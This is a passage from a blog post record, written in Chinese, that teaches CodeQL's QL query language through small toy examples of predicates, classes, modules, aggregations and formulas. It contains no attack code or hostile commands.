\"Germany\"\n\tor\n\tcountry = \"Germany\" and result = \"Austria\"\n\tor\n\tcountry = \"Germany\" and result = \"Belgium\"\n}\n\nselect getANeighbor(\"France\")\n```\n\n## Recursive(递归) predicates\n\n```java\nstring getANeighbor(string country) {\n  country = \"France\" and result = \"Belgium\"\n  or\n  country = \"France\" and result = \"Germany\"\n  or\n  country = \"Germany\" and result = \"Austria\"\n  or\n  country = \"Germany\" and result = \"Belgium\"\n  or\n  country = getANeighbor(result)\n}\n```\n\n## Kinds(种类) of predicates\n\n谓词有三种类型，即Non-member谓词、member谓词和Characteristic谓词。\n\n非成员谓词是在类之外定义的，也就是说，它们不是任何类的成员。\n\n```java\nint getSuccessor(int i) {  // 1. Non-member predicate\n  result = i + 1 and\n  i in [1 .. 9]\n}\n\nclass FavoriteNumbers extends int {\n  FavoriteNumbers() {  // 2. Characteristic predicate\n    this = 1 or  //特征谓词是类的构造函数中定义的谓词，用来描述类的成员资格（membership criteria）。它决定了一个值是否属于某个类。\n    this = 4 or\n    this = 9\n  }\n\n  string getName() {   // 3. Member predicate for the class `FavoriteNumbers`\n    this = 1 and result = \"one\"\n    or\n    this = 4 and result = \"four\"\n    or\n    this = 9 and result = \"nine\"\n  }\n}\n\nfrom FavoriteNumbers fn, string name\nwhere fn = 4 and fn.getName() = name  // 成员谓词只能在类的实例上应用\nselect name\n```\n\n## Binding behavior\n\nIt must be possible to evaluate a predicate in a finite(有限的) amount of time, so the set it describes is not usually allowed to be infinite(无限的). In other words, a predicate can only contain a finite number of tuples.\n\n这里的无限其实也不是无穷大或者无穷多。上面和下面的那些反例其实也就是多了一点判断条件。\n\n```java\nint getSuccessor(int i) {\n\tresult = i + 1 and\n\ti in [1 .. 9]\n}\n```\n\n```java\n/*\n  Compilation errors:\n  ERROR: \"i\" is not bound to a value.\n  ERROR: \"result\" is not bound to a value.\n  ERROR: expression \"i * 4\" is not bound to a value.\n*/\nint multiplyBy4(int i) {\n  result = i * 4\n}\n\n/*\n  Compilation errors:\n  ERROR: \"str\" is not bound to a value.\n  ERROR: expression \"str.length()\" is not bound to a value.\n*/\npredicate shortString(string str) {\n  str.length() < 10\n}\n```\n\n### Binding sets\n\n如果一定要用infinite的谓词。\n\n在这种情况下，您可以使用 bindingset 注释指定显式绑定集。此注释适用于任何类型的谓词。\n\n```java\nbindingset[i]\nint multiplyBy4(int i) {\n  result = i * 4\n}\n\nfrom int i\nwhere i in [1 .. 10]\nselect multiplyBy4(i)\n```\n\n也可以多个，这种形式的意思是。x,y至少有一个是bound的。和bindingset[x, y]不同，意味着两个都是bound的\n\n- If `x` is bound, then `x` and `y` are bound.\n- If `y` is bound, then `x` and `y` are bound.\n\n```java\nbindingset[x] bindingset[y]\npredicate plusOne(int x, int y) {\n  x + 1 = y\n}\n\nfrom int x, int y\nwhere y = 42 and plusOne(x, y)\nselect x, y\n```\n\n后者可以用于两种不同类型的情况\n\n```java\nbindingset[str, len]\nstring truncate(string str, int len) {\n  if str.length() > len\n  then result = str.prefix(len)\n  else result = str\n}\n```\n\n\n\n# 查询Queries\n\n```sql\nfrom /* ... 声明变量 ... */\nwhere /* ... logical formula ... */\nselect /* ... expressions ... */\n```\n\n除了“表达式”中描述的表达式之外，您还可以包括：\nas 关键字，后跟名称。这为结果列提供了“标签”，并允许您在后续的选择表达式中使用它们。\norder by 关键字，后跟结果列的名称，以及可选的关键字 asc 或 desc。这决定了显示结果的顺序。\n\nfrom 和 where 部分是可选的。\n\n除了“表达式”中描述的表达式之外，您还可以包括：\n\n- as 关键字，后跟名称。这为结果列提供了“标签”，并允许您在后续的选择表达式中使用它们。\n- order by 关键字，后跟结果列的名称，以及可选的关键字 asc 或 desc。这决定了显示结果的顺序。\n\n这些和sql都差不多，不同地方在于是，这里的from可以声明变量。\n\n例子\n\n```sql\nfrom int x, int y\nwhere x = 3 and y in [0 .. 2]\nselect x, y, x * y as product, \"product: \" + product\n```\n\n## Query predicates\n\n```java\nint getProduct(int x, int y) {\n    x = 3 and\n    y in [0 .. 2] and\n    result = x * y\n}\n\nfrom int x, int y\nwhere x = 3 and y = 1 \nselect x, y,getProduct(x, y)\n```\n\n这个查询谓语返回以下结果\n\n| x    | y    | result |\n| :--- | :--- | :----- |\n| 3    | 0    | 0      |\n| 3    | 1    | 3      |\n| 3    | 2    | 6      |\n\n编写查询谓词而不是 select 子句的一个好处是，您也可以在代码的其他部分调用该谓词。相比之下，select 子句就像一个匿名谓词，因此您无法稍后调用它。\n\n# Types\n\n## Primitive types\n\n有以下这些类型。\n\nboolean，float，int，string，date。\n\nQL 在原始类型上定义了一系列内置操作，例如，1.toString() 是整数常量 1 的字符串表示形式。有关 QL 中可用的内置操作的完整列表，请参阅 QL 语言规范中的内置部分。\n\nhttps://codeql.github.com/docs/ql-language-reference/ql-language-specification/#built-ins\n\n> 此外，QlBuiltins::BigInt 中还有一个实验性的任意精度整数原始类型。默认情况下，此类型在 CodeQL CLI 中不可用，但可以通过将 --allow-experimental=bigint 选项传 来启用它。\n\n## Classes\n\n### 定义一个类\n\n1. class 关键字\n2. class 名，要求首字母大写\n3. 通过 extends和instanceof定义的supertypes\n4. 括号括起来的类体\n\n```java\nclass OneTwoThree extends int {\n  OneTwoThree() { // characteristic predicate\n    this = 1 or this = 2 or this = 3\n  }\n\n  string getAString() { // member predicate\n    result = \"One, two or three: \" + this.toString()\n  }\n\n  predicate isEven() { // member predicate\n    this = 2\n  }\n}\n```\n\n定义了一个类 OneTwoThree，它包含值 1 2 3。\n\nOneTwoThree 继承了 int，也就是说，它是 int 的子类。QL 中的类必须始终具有至少一个supertypes。使用 extends 关键字引用的supertypes称为**base types** of the class。\n\n### Class bodies\n\nThe body of a class can contain:\n- A characteristic predicate declaration.  // 前面讲 谓词种类 的时候都提到了 #Kinds(种类) of predicates\n- Any number of member predicate declarations. \n- Any number of field declarations.\n\n#### Characteristic predicates\n\n相当于构造方法。前面提到过\n\n#### Member predicates\n\n可以用这种方法调用一个member predicate\n\n```\n(OneTwoThree).getAString()\n```\n\n#### Fields\n\n在body of a class中进行声明，例子如下。\n\n```java\nclass SmallInt extends int {\n  SmallInt() { this = [1 .. 10] }\n}\n\nclass DivisibleInt extends SmallInt {\n  SmallInt divisor;   // declaration of the field `divisor`\n  DivisibleInt() { this % divisor = 0 }\n\n  SmallInt getADivisor() { result = divisor }\n}\n\nfrom DivisibleInt i\nselect i, i.getADivisor()\n```\n\n### Concrete classes\n\n比如上面那个 DivisibleInt 有一个  SmallInt 的 Fields\n\n下面这些就和面向对象的语言很相似，看一下名字就知道是什么意思。不细讲。\n\n### Abstract classes\n\n抽象类\n\n### Overriding member predicates\n\n重写父类谓词\n\n### Multiple inheritance\n\n多继承\n\n### Final extensions\n\n类似于final关键字。\n\n### Non-extending subtypes\n\n其实就是有点像接口，下面这个会报错。instanceof 声明的超类型中的字段和方法不会成为子类的一部分\n\n```java\nclass Foo extends int {\n    Foo() { this in [1 .. 10] }\n  \n    string fooMethod() { result = \"foo\" }\n  }\n  \n  class Bar instanceof Foo {\n    string toString() { result = super.fooMethod() }\n}\n\nselect any(Bar b).fooMethod()\n```\n\n```java\nclass Interface extends int {\n    Interface() { this in [1 .. 10] }\n    string foo() { result = \"\" }\n  }\n  \n  class Foo extends int {\n    Foo() { this in [1 .. 5] }\n    string foo() { result = \"foo\" }\n  }\n  \n  class Bar extends Interface instanceof Foo {\n    override string foo() { result = \"bar\" }\n}\n\nselect any(Bar b).foo()  // 返回 bar\n// select any(Foo f).foo()   // 返回foo\n```\n\n## \n\n# Modules\n之类就给一个例子吧，太复杂的官方也没有给例子，这就是好多语言都有的一个东西。\n\n**OneTwoThreeLib.qll**\n```java\nclass OneTwoThree extends int {\n    OneTwoThree() {\n      this = 1 or this = 2 or this = 3\n    }\n  }\n\n\nmodule M {\nclass OneTwo extends OneTwoThree {\n    OneTwo() {\n\t    this = 1 or this = 2\n\t    }\n\t}\n}\n\n```\n\n**OneTwoQuery.ql**\n```java\nimport OneTwoThreeLib\n\nfrom OneTwoThree ott\nwhere ott = 1 or ott = 2\nselect ott\n```\n\n在对chat的逼问之下，还是把这个调用方法给问出来了。\n**OneTwoQuery2.ql**\n```java\n// 导入库文件\nimport OneTwoThreeLib\n\n// 使用 M 模块中的 OneTwo 类\n\nfrom M::OneTwo oneTwoInstance\n\nselect oneTwoInstance, \"Instance of OneTwo\"\n```\n\n# Signatures\n\n这个概念其实比较抽象。我暂时不想详细的写。这里就直接给官网的例子了。但是手边暂时没有具体使用的案例。\n\n## Predicate signatures\n\n注意这个分号\n\n```java\nsignature int operator(int lhs, int rhs);\n```\n\n## Type signatures\n\n```java\nsignature class ExtendsInt extends int;\n\nsignature class CanBePrinted {\n  string toString();\n}\n```\n\n## Module signatures\n\n```java\nsignature module MSig {\n  class T;\n  predicate restriction(T t);\n  default string descr(T t) { result = \"default\" }\n}\n\nmodule Module implements MSig {\n  newtype T = A() or B();\n\n  predicate restriction(T t) { t = A() }\n}\n```\n\n### Parameterized module signatures\n\n```java\nsignature class NodeSig;\n\nsignature module EdgeSig<NodeSig Node> {\n  predicate apply(Node src, Node dst);\n}\n\nmodule Reachability<NodeSig Node, EdgeSig<Node> Edge> {\n  Node reachableFrom(Node src) {\n    Edge::apply+(src, result)\n  }\n}\n```\n\n# Aliases\n\n## Defining an alias\n\n### Module aliases\n\n```java\nmodule ModAlias = ModuleName;\n```\n\n下面这个会弃用oldversion。\n\n```java\ndeprecated module OldVersion = NewVersion;\n```\n\n### Type aliases\n\n```java\nclass TypeAlias = TypeName;\n```\n\n你可以使用别名将基本类型boolean的名称缩写为Bool：\n\n```java\nclass Bool = boolean;\n```\n\n在OneTwoThreeLib中使用模块M中定义的类OneTwoThreeLib.qll，你可以创建一个别名来使用更短的名称OT\n\n```java\nimport OneTwoThreeLib\n\nclass OT = M::OneTwo;\n\n...\n\nfrom OT ot\nselect ot\n```\n\n### Predicate aliases\n\n```java\nint getSuccessor(int i) {\n  result = i + 1 and\n  i in [1 .. 9]\n}\n```\n\n可以为这个谓语设置一个这样的别名。\n\n```java\npredicate succ = getSuccessor/1;\n```\n\n### Strong and weak aliases\n\n有annotation 注解的是 Strong aliases。来自相同module/type/predicate的weak aliases定义之间的别名歧义是允许的，但来自不同Strong aliases定义之间的别名歧义是无效的QL。\n\n> Every alias definition is either **strong** or **weak**. An alias definition is **strong** if and only if it is a [type alias](https://codeql.github.com/docs/ql-language-reference/aliases/#type-aliases) definition with [annotation](https://codeql.github.com/docs/ql-language-reference/annotations/#annotations) `final`. During [name resolution](https://codeql.github.com/docs/ql-language-reference/name-resolution/#name-resolution), ambiguity between aliases from **weak** alias definitions for the same module/type/predicate is allowed, but ambiguity between between aliases from distinct **strong** alias definitions is invalid QL. Likewise, for the purpose of applicative instantiation of [parameterised modules](https://codeql.github.com/docs/ql-language-reference/modules/#parameterized-modules) and :ref:`parameterised module signatures <parameterized-module-signatures>, aliases from **weak** alias definitions for instantiation arguments do not result in separate instantiations, but aliases from **strong** alias definitions for instantiation arguments do.\n\n# Variables\n\n## Declaring a variable\n\n其实前面就一只在遇见了。声明，赋值，输出。\n\n```java\nfrom int i\nwhere i = 10\nselect i\n  \nfrom int i\nwhere i in [0 .. 9]\nselect i\n```\n\n## Free and bound variables\n\n```java\n\"hello\".indexOf(\"l\")\nmin(float f | f in [-3 .. 3])\n(i + 7) * 3\nx.sqrt()\n```\n\n第一个没有 variables  ，值是2\n\n第二个**bound variable**  ，值恒为3\n\n第三个**free variables** ，i 的值影响着整体的值。表达式是否成立取决于i的值。\n\n```java\n\"hello\".indexOf(\"l\") = 1\nmin(float f | f in [-3 .. 3]) = -3\n(i + 7) * 3 instanceof int\nexists(float y | x.sqrt() = y)\n```\n\n第一个永远不成立。\n\n第二个永远成立\n\n第三个可能成立\n\n第四个单y为负数时永远不成立\n\n# Expressions\n\n## Literals\n\nInteger literals\n\n```\n0\n42\n-2048\n```\n\nFloat literals\n\n```\n2.0\n123.456\n-100.5\n```\n\n等等\n\n## Parenthesized(括号) expressions\n\n## Ranges\n\n其实前面也见到一些了\n\n`[3 .. 7]`表示的是3到7的整数\n\n## Set literal expressions\n\n`[2, 3, 5, 7, 11, 13, 17, 19, 23, 29]` 是一个集合参数\n\n## Super expressions\n\n这个直接看例子，其实就是super.  然后找父类。\n\n```java\nclass A extends int {\n  A() { this = 1 }\n  int getANumber() { result = 2 }\n}\n\nclass B extends int {\n  B() { this = 1 }\n  int getANumber() { result = 3 }\n}\n\nclass C extends A, B {\n  // Need to define `int getANumber()`; otherwise it would be ambiguous\n  override int getANumber() {\n    result = B.super.getANumber()\n  }\n}\n\nfrom C c\nselect c, c.getANumber()\n```\n\n## Calls to predicates\n\n调用类的方法\n\n例如 a.getAChild() 是调用的 a 的谓词 getAChild()\n\n## Aggregations\n\n```\n<aggregate>(<variable declarations> | <formula> | <expression>)\n```\n\n```java\n// 内容超过500行的文件\ncount(File f | f.getTotalNumberOfLines() > 500 | f)   \n// 寻找函数最多的js文件。  \nmax(File f | f.getExtension() = \"js\" | f.getBaseName() order by f.getTotalNumberOfLines(), f.getNumberOfLinesOfCode())\n// 逐个字符比较 返回 De Morgan\nmin(string s | s = \"Tarski\" or s = \"Dedekind\" or s = \"De Morgan\" | s)\n// 返回36，等等吧，还有很多。\nsum(int i, int j | i = [0 .. 2] and j = [3 .. 5] | i * j)\n```\n\n### Evaluation of aggregates\n\n以这个为例\n\n```java\nselect sum(int i, int j |\n    exists(string s | s = \"hello\".charAt(i)) and \n    exists(string s | s = \"world!\".charAt(j)) \n    | i)\n```\n\n步骤\n\n1. **确定输入变量**：这是聚合表达式中声明的变量，包括在聚合内声明的变量和在聚合外部使用的变量。\n\n2. **生成所有可能的元组（组合）**：这些元组是输入变量的所有可能值的组合，必须满足给定的条件公式。\n\n3. **应用 <expression>**：对每个元组应用<expression>，并收集生成的值（可能有多个不同的值）。\n\n4. **应用 aggregates function**：使用 aggregates function（如 sum、count 等）对第3步中生成的值进行处理，计算最终结果。\n\n**1. 确定输入变量：**\n\n•输入变量是 i 和 j，分别代表 \"hello\" 和 \"world!\" 中的字符位置。\n\n**2. 生成所有可能的元组：**\n\n•我们通过 exists(string s | s = \"hello\".charAt(i)) 和 exists(string s | s = \"world!\".charAt(j)) 来生成所有可能的 (i, j) 对，表示字符串 \"hello\" 和 \"world!\" 中字符的位置。\n\n•\"hello\" 有 5 个字符（0, 1, 2, 3, 4），而 \"world!\" 有 6 个字符（0, 1, 2, 3, 4, 5）。\n\n•所以所有可能的 (i, j) 对是：\n\n```\n(0, 0), (0, 1), (0, 2), (0, 3), (0, 4), (0, 5),\n(1, 0), (1, 1), (1, 2), (1, 3), (1, 4), (1, 5),\n(2, 0), (2, 1), (2, 2), (2, 3), (2, 4), (2, 5),\n(3, 0), (3, 1), (3, 2), (3, 3), (3, 4), (3, 5),\n(4, 0), (4, 1), (4, 2), (4, 3), (4, 4), (4, 5)\n```\n\n**3. 应用<expression>：**\n\n•在这个查询中，聚合表达式是 i。我们从每个元组中选择 i 的值。\n\n•例如，所有 30 个元组中，i 的值会分别为：\n\n`0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 2, 2, 3, 3, 3, 3, 3, 3, 4, 4, 4, 4, 4, 4`\n\n**4. 应用 aggregates function：**\n\n`0 + 0 + 0 + 0 + 0 + 0 + 1 + 1 + 1 + 1 + 1 + 1 + 2 + 2 + 2 + 2 + 2 + 2 + 3 + 3 + 3 + 3 + 3 + 3 + 4 + 4 + 4 + 4 + 4 + 4`\n\n值为60。\n\n如果为这种\n\n```java\nselect sum(int i, int j |\n    exists(string s | s = \"hello\".charAt(i)) and \n    exists(string s | s = \"world!\".charAt(j)) \n    | i+j)\n```\n\n```\n0 + 0 = 0\n0 + 1 = 1\n0 + 2 = 2\n...\n4 + 5 = 9\n```\n\n值为135\n\n按照那4步来就行。\n\n### Omitting parts of an aggregation\n\n其实有些地方可以适当简写。\n\n1. **省略 <variable declarations> 和 <formula>**\n\n```\n<aggregate>(<type> v | <expression> = v | v)\n简写成\n<aggregate>(<expression>)\n```\n\n例如\n\n```java\ncount(int i | i = \"hello\".indexOf(\"l\") | i)\ncount(\"hello\".indexOf(\"l\"))\n```\n\n• \"hello\".indexOf(\"l\") 直接返回所有 \"l\" 的索引位置（2, 3）。\n\n• count 统计这些索引的个数，因此两种写法等价。\n\n2. **省略 <expression>**\n\n如果只有一个aggregation variable，则可以省略 aggregation variable，此时表达式默认为该变量本身。\n\n```\navg(int i | i = [0 .. 3] | i)\navg(int i | i = [0 .. 3])\n```\n\n3. 在 count 中，即使有多个aggregation variable，也可以省略 <expression>，此时表达式默认为常量 1，即统计满足条件的所有元组数量。\n\n```java\ncount(int i, int j | i in [1 .. 3] and j in [1 .. 3] | 1)\ncount(int i, int j | i in [1 .. 3] and j in [1 .. 3])\n```\n\n4. **省略 <formula>，仅保留两个竖线 ||**\n\n```\n<aggregate>(<variable declarations> | | <expression>)\n```\n\n```java\nmax(File f | | f.getTotalNumberOfLines())\n```\n\n这段代码的意思是：统计数据库中所有文件的最大行数。\n\n5. **省略 <formula> 和 <expression>**\n\n```java\ncount(File f | any() | 1)\ncount(File f | | 1)\ncount(File f)\n```\n\ncount(File f) 直接统计数据库中的文件数量。\n\n### Monotonic(单调) aggregates\n\n直接看官方给的例子吧。\n\n```java\nstring getPerson() { result = \"Alice\" or\n                     result = \"Bob\" or\n                     result = \"Charles\" or\n                     result = \"Diane\"\n                   }\nstring getFruit(string p) { p = \"Alice\"   and result = \"Orange\" or\n                            p = \"Alice\"   and result = \"Apple\" or\n                            p = \"Bob\"     and result = \"Apple\" or\n                            p = \"Charles\" and result = \"Apple\" or\n                            p = \"Charles\" and result = \"Banana\"\n                          }\nint getPrice(string f) { f = \"Apple\"  and result = 100 or\n                         f = \"Orange\" and result = 100 or\n                         f = \"Orange\" and result =   1\n                       }\n\npredicate nonmono(string p, int cost) {\n  p = getPerson() and cost = sum(string f | f = getFruit(p) | getPrice(f))\n}\n\nlanguage[monotonicAggregates]\npredicate mono(string p, int cost) {\n  p = getPerson() and cost = sum(string f | f = getFruit(p) | getPrice(f))\n}\n\nfrom string variant, string person, int cost\nwhere variant = \"default\"  and nonmono(person, cost) or\n      variant = \"monotonic\" and mono(person, cost)\nselect variant, person, cost\norder by variant, person\n```\n\n| variant   | person  | cost |\n| :-------- | :------ | :--- |\n| default   | Alice   | 201  |\n| default   | Bob     | 100  |\n| default   | Charles | 100  |\n| default   | Diane   | 0    |\n| monotonic | Alice   | 101  |\n| monotonic | Alice   | 200  |\n| monotonic | Bob     | 100  |\n| monotonic | Diane   | 0    |\n\n**标准聚合** 和 **单调聚合** 在处理公式 <formula> 和表达式 <expression> 的值时有如下不同：\n\n**标准聚合：**\n\n•对每个由 <formula> 生成的值，计算对应的 <expression> 值，**将它们展平为一个列表**。\n\n•然后对这个列表应用聚合函数，例如 sum、count 等。\n\n**单调聚合：**\n\n•对每个由 <formula> 生成的值，计算对应的 <expression> 值，**创建所有可能的组合**。\n\n•对每种组合分别应用聚合函数。\n\n**结果差异：**\n\n•**标准聚合** 通常返回一个结果，表示所有值的总和、计数等。\n\n•**单调聚合** 会返回多行结果，表示每种可能组合的聚合值。\n\n**场景 1: 缺少 <expression> 值**\n\n•如果 <formula> 生成的某个值没有对应的 <expression> 值：\n\n•**标准聚合** 会忽略这个缺失值，计算其他值的结果。\n\n•**单调聚合** 不会计算结果，因为缺失值使得无法创建完整的组合。\n\n**场景 2: 多个 <expression> 值**\n\n•如果 <formula> 生成的某个值有多个对应的 <expression> 值：\n\n•**标准聚合** 将所有 <expression> 值展平成一个列表，计算一个结果。\n\n•**单调聚合** 会生成多种组合，对每种组合分别计算结果。\n\n#### Recursive monotonic aggregates\n\n暂时不讲解\n\n## Any\n\n| Expression                          | Values                                      |\n| :---------------------------------- | :------------------------------------------ |\n| `any(File f)`                       | all `File`s in the database                 |\n| `any(Element e | e.getName())`      | the names of all `Element`s in the database |\n| `any(int i | i = [0 .. 3])`         | the integers `0`, `1`, `2`, and `3`         |\n| `any(int i | i = [0 .. 3] | i * i)` | the integers `0`, `1`, `4`, and `9`         |\n\n## Unary operations\n\n```\n-6.28\n+(10 - 4)\n+avg(float f | f = 3.4 or f = -9.8)\n-sum(int i | i in [0 .. 9] | i * i)\n```\n\n## Binary operations\n\n```\n5 % 2\n(9 + 1) / (-2)\n\"Q\" + \"L\"\n2 * min(float f | f in [-3 .. 3])\n```\n\n## Casts(类型转换)\n\n```java\nimport java\n\nfrom Type t\nwhere t.(Class).getASupertype().hasName(\"List\")\nselect t\n```\n\n## Don’t-care expressions\n\n其实这个符号在其它语言也经常见\n\n```java\nfrom string s\nwhere s = \"hello\".charAt(_)\nselect s\n```\n\n# Formulas 公式\n\n## Comparisons 比较\n\n这里提一下。\n就是一个等号在这里代表的就是Equal to\nNot equal to就是 !=\n定义的话用的是from\n\n## Type checks\n\n类型检查，和java里面的instanceof功能差不多\n\n`<expression> instanceof <type>`\n\n## Range checks\n检查范围\nA range check is a formula that looks like:\n`<expression> in <range>`\n\n`x in [2.1 .. 10.5]` \n\n## Calls to predicates\n\n谓词调用。\n\n## Parenthesized formulas\n\n杯括号包裹起来的 formulas\n\n\n### Explicit quantifiers显示量词\n\n#### `exists`\n\n都很好理解。\n\nThis quantifier has the following syntax:\n\n```\nexists(<variable declarations> | <formula>)\n```\n\nYou can also write `exists(<variable declarations> | <formula 1> | <formula 2>)`. This is equivalent to `exists(<variable declarations> | <formula 1> and <formula 2>)`.\n\nThis quantified formula introduces some new variables. It holds if there is at least one set of values that the variables could take to make the formula in the body true.\n\nFor example, `exists(int i | i instanceof OneTwoThree)` introduces a temporary variable of type `int` and holds if any value of that variable has type `OneTwoThree`.\n\n#### `forall`\n\nThis quantifier has the following syntax:\n\n```\nforall(<variable declarations> | <formula 1> | <formula 2>)\n```\n\n`forall` introduces some new variables, and typically has two formulas in its body. It holds if `<formula 2>` holds for all values that `<formula 1>` holds for.\n\nFor example, `forall(int i | i instanceof OneTwoThree | i < 5)` holds if all integers that are in the class `OneTwoThree` are also less than `5`. In other words, if there is a value in `OneTwoThree` that is greater than or equal to `5`, then the formula doesn’t hold.\n\nNote that `forall(<vars> | <formula 1> | <formula 2>)` is logically the same as `not exists(<vars> | <formula 1> | not <formula 2>)`.\n\n#### `forex`\n\nThis quantifier has the following syntax:\n\n```\nforex(<variable declarations> | <formula 1> | <formula 2>)\n```\n\nThis quantifier exists as a shorthand for:\n\n```\nforall(<vars> | <formula 1> | <formula 2>) and\nexists(<vars> | <formula 1> | <formula 2>)\n```\n\n> In other words, `forex` works in a similar way to `forall`, except that it ensures that there is at least one value for which `<formula 1>` holds. To see why this is useful, note that the `forall` quantifier could hold trivially. For example, `forall(int i | i = 1 and i = 2 | i = 3)` holds: there are no integers `i` which are equal to both `1` and `2`, so the second part of the body `(i = 3)` holds for every integer for which the first part holds.\n>\n> Since this is often not the behavior that you want in a query, the `forex` quantifier is a useful shorthand.\n\n### Implicit quantifiers\n\n相当于我们上面提到的 Don’t-care expressions。\n\n## Logical connectives\n\n1. Negation (not)\n2. Conditional formula (if…..then…else)\n3. Conjunction (and)\n4. Disjunction (or)\n5. Implication (implies)\n\n### `any()`\n\n### `none()`\n\n### `not`\n\n……\n\n# Annotations\n\n有点像java里面的修饰符。\n\n像 `abstract` `deprecated` `final`这些前面都提到过。\n\n# Lexical syntax\n\n## Comments\n\n有两种注释方法。\n\n```java\n/**\n * A QLDoc comment that describes the class `Digit`.\n */\nclass Digit extends int {  // A short one-line comment\n  Digit() {\n    this in [0 .. 9]\n  }\n}\n\n/*\n  A standard multiline comment, perhaps to provide\n  additional details, or to write a TODO comment.\n*/\n```\n\n# Name resolution(解析)\n\n## Names\n\n处理一个name首先在当前模块的命名空间中查找名称。\n\n如果是import语句。name resolution会更加复杂，看下面这个例子。\n\n```java\nimport javascript\n```\n\n编译器首先检查库模块javascript.qll，再采取下面说到的那些步骤。如果失败，它会检查在Example.ql的模块命名空间中定义的名为javascript的explicit module。\n\n## Qualified references\n\n限定引用是一种模块表达式，使用 . 作为文件路径分隔符。它只能在 import 语句中使用，用于导入由相对路径定义的库模块。比如我们Example.ql有如下一个import语句。\n\n```java\nimport examples.security.MyLibrary\n```\n\n**1. 当前目录查找** 编译器首先从包含当前 Example.ql 文件的目录中查找目标文件 examples/security/MyLibrary.ql\n\n**2. 查询目录查找** 查找相对路径 examples/security/MyLibrary.qll。如果查询目录未配置或路径中未找到目标文件，继续下一步。查询目录是第一个包含qlpack.yml文件的目录。（或者，在老版本中，是一个名为queries.xml的文件。）\n\n**3. 库路径查找 ** 查看qlpack.yml 文件中的 libraryPathDependencies 设置\n\n**4. 查找失败** 如果还找不到编译会报错。\n\n## Selections\n\n```\n<module_expression>::<name>\n```\n\n### Example\n\n**CountriesLib.qll**\n\n```java\nclass Countries extends string {\n  Countries() {\n    this = \"Belgium\"\n    or\n    this = \"France\"\n    or\n    this = \"India\"\n  }\n}\n\nmodule M {\n  class EuropeanCountries extends Countries {\n    EuropeanCountries() {\n      this = \"Belgium\"\n      or\n      this = \"France\"\n    }\n  }\n}class Countries extends string {\n  Countries() {\n    this = \"Belgium\"\n    or\n    this = \"France\"\n    or\n    this = \"India\"\n  }\n}\n\nmodule M {\n  class EuropeanCountries extends Countries {\n    EuropeanCountries() {\n      this = \"Belgium\"\n      or\n      this = \"France\"\n    }\n  }\n}\n```\n\n可以用如下方式使用\n\n```java\nimport CountriesLib\n\nfrom M::EuropeanCountries ec\nselect ec\n```\n\n```java\nimport CountriesLib::M\n\nfrom EuropeanCountries ec\nselect ec\n```\n\n## Namespaces\n\n命名空间。和其它语言比较像，不过多解释。\n\n### Global namespaces\n\n### Local namespaces\n\n# QL language specification\n\n语言规范太多了，这里就不细讲了。\n\nhttps://codeql.github.com/docs/ql-language-reference/ql-language-specification/\n","source":"_posts/codeql基础语法学习.md","raw":"---\ntags:\n  - 代码审计\n  - myblog\ntitle: codeql基础语法学习\n---\ncsdn上阅读体验更加，这个目录太长这里用着不太舒服\nhttps://blog.csdn.net/qq_72685284/article/details/144118176\n\n网上对于codeql的基础讲解的比较少，很多都是直接从codeql for java 或者直接拿一个靶场开始练习的。我通过对官方文档的一些翻译和加上自己的一些个人的理解和丰富合适的例子。帮助新人对codeql有一个基础的认识。因为好多英文名词并没有比较统一的翻译，所以我这里会标注一些关键的英文词的中文含义，很多意思还需要大家从英文的原文中体会其中的含义，同时方便大家结合文档进行查看。\n\n参考文档。\n\nhttps://codeql.github.com/docs/ql-language-reference/about-the-ql-language/\n\n# declarative languages\n\n声明式(declarative)是结果导向的，命令式(imperative)是过程导向的。它们都有自己适用的场景和局限，于是现实中的编程语言常常都有两者的身影。\n\ndeclarative 案例 ： SQL, HTML ,codeql\n\nimperative 案例 ： C, C++, Java\n\n>QL is a declarative, object-oriented(面向对象的) query language that is optimized(优化) to enable efficient analysis of hierarchical data structures, in particular, databases representing software artifacts.\n>\n>The syntax(语法) of QL is similar to SQL, but the semantics(语意) of QL are based on Datalog, a declarative logic programming language often used as a query language. This makes QL primarily a logic language, and all operations in QL are logical operations. Furthermore, QL inherits recursive(递归) predicates(谓语) from Datalog, and adds support for aggregates(聚合), making even complex queries concise(简洁) and simple. \n\n总之就是codeql的语法和常规的编程语言不太一样，他是基于datalog的，不能拿C,java 那类语言去类比，有很多的概念和专业用语都是不太一样的。\n\n> Object orientation(面向对象) is an important feature of QL. The benefits of object orientation are well known – it increases modularity(模块化), enables information hiding, and allows code reuse(复用). QL offers all these benefits without compromising(妥协) on its logical foundation. This is achieved by defining a simple object model where classes are modeled as predicates and inheritance as implication. The libraries made available for all supported languages make extensive use of classes and inheritance.\n\n与sql相比，codeql的语言功能更加丰富，增加了面相对象的特性。可以自定义谓词。\n\n# 谓词Properties\n\n谓词用于描述构成 QL 程序的逻辑关系。\n\n严格来说，谓词求值为一组元组。例如，考虑以下两个谓词定义：\n\n```java\npredicate isCountry(string country) {\n  country = \"Germany\"\n  or\n  country = \"Belgium\"\n  or\n  country = \"France\"\n}\n\npredicate hasCapital(string country, string capital) {\n  country = \"Belgium\" and capital = \"Brussels\"\n  or\n  country = \"Germany\" and capital = \"Berlin\"\n  or\n  country = \"France\" and capital = \"Paris\"\n}\n\nfrom string country, string capital\nwhere hasCapital(country, capital) and country = \"Germany\"\nselect country, capital\n```\n\n谓词 isCountry 返回的是一组一元组 {(\"Belgium\"),(\"Germany\"),(\"France\")}，而 hasCapital 是一组二元组 {(\"Belgium\",\"Brussels\"),(\"Germany\",\"Berlin\"),(\"France\",\"Paris\")}。这些谓词的元数分别为 1 和 2。\n\n通常，谓词中的所有元组都具有相同数量的元素。谓词的 arity 就是元素的数量，不包括可能的结果变量。\n\nQL 中有许多内置谓词。您可以在任何查询中使用这些谓词，而无需导入任何其他模块。除了这些内置谓词之外，您还可以定义自己的谓词：\n\n## 谓词组成\n\n- 谓词的关键字predicate，或者谓词的返回值。（谓词可以分为without result 和 with result）\n- 谓词名词\n- 谓词参数\n- 谓词主体\n\n## without result\n\n开头那两个谓词也是 without result 的\n\n```java\npredicate isSmall(int i) {\n    i in [1 .. 9]\n}\n\nfrom int i\nwhere isSmall(i)\nselect i\n```\n\n## with result\n\n您可以通过将关键字 predicate 替换为结果类型来定义带有结果的谓词。这引入了特殊变量 result。result的值就是我们的返回值。\n\n这个from就是定义一个变量。\n\n```java\nint getSuccessor(int i) {\n\tresult = i + 1 and\n\ti in [1 .. 9]\n}\n\nfrom int x\nselect x,getSuccessor(x)\n```\n\n可以在谓词主体中调用其他的谓词\n\n```java\nPerson getAChildOf(Person p) {\n  p = 